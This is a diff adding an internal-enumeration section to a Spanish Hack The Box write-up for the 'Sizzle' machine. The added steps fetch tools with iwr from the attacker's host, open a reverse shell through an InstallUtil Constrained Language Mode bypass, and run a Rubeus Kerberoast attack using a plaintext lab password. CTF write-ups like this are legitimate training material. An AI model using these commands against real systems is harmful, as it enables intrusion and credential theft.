@@ -278,8 +278,46 @@ Gracias a este certificado, podemos conectarnos al servicio 'winrm' a través de
 
     └─# evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p '<REDACTED>'
 
+### 10.10.10.103 - Enumeración interna
+
+Una vez dentro de la consola de 'winrm', intentamos subir la herramienta 'BloodHound' para exportar un esquema de usuarios y grupos del Directorio Activo, pero nos da un error:
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/c6ad7195-0f0d-40d7-86cf-f73b83324302)
+
+Esto se debe al modo del lenguaje utilizado por la máquina:
+
+    *Evil-WinRM* PS C:\Users\amanda\Documents> $ExecutionContext.SessionState.LanguageMode
+    ConstrainedLanguage
+
+Para cambiarlo, podemos descargarnos el binario PSByPassCLM.exe del repositorio GitHub https://github.com/padovah4ck/PSByPassCLM y subirlo a través del método Powershell 'iwr':
+
+    iwr -uri http://10.10.14.18/PSByPassCLM.exe -outFile PSByPassCLM.exe
+
+Una vez subido, ejecutamos el comando siguiente apuntando a nuestro host y a nuestro puerto, que tendremos en escucha por netcat:
+
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.18 /rport=443 /U C:\Users\amanda\Documents\PsBypassCLM.exe
+
+Una vez que recibimos la shell inversa, lanzamos el comando en esta nueva shell y vemos que el lenguaje a cambiado a modo 'Full':
+
+    PS C:\Windows\Temp\Recon> $ExecutionContext.SessionState.LanguageMode
+    FullLanguage
+
+Una vez aquí, podemos ejecutar SharpHound o cualquier otro binario sin problemas por ejemplo en C:\Windows\Temp\Recon.
+
+Subimos 'Rubeus.exe' para ver si existe algún usuario kerberoastable:
+
+    iwr -uri http://10.10.14.18/Rubeus.exe -OutFile r.exe
+
+Ejecutamos el comando con nuestras credenciales de 'amanda' y descubrimos que el usuario 'mrlky' es vulnerable a un ataque Kerberoast:
+
+    .\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap
+
+![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/9278314e-14af-4d22-830a-8819a6182718)
 
 
+
+
+    
 
 
 
